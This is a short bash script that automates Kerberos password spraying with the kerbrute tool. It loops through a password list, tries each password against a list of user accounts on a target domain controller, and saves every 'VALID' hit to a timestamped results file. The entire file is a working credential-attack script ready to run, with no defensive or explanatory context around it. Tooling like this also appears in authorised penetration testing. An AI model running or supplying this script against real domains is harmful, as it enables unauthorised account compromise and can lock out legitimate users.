#!/bin/bash

# Variables for the parameters
OUTPUT_FILE="results_passwordspray_${DOMAIN}_$(date +%Y%m%d_%H%M%S).txt"
COUNTER=1

source ./helpMenu.sh


while IFS= read -r LINE
do
        echo "Testing line: ${COUNTER} with the password: ${LINE}"
        ./kerbrute_linux_amd64 passwordspray ${USERSLIST} ${LINE} -d ${DOMAIN} --dc ${DC_IP} -t ${THREADS:-15} | grep -Ei "VALID" | tee -a ${OUTPUT_FILE}
        COUNTER=$((COUNTER+1))
        echo ""
        echo ""
done < "${PASSWORDLIST}"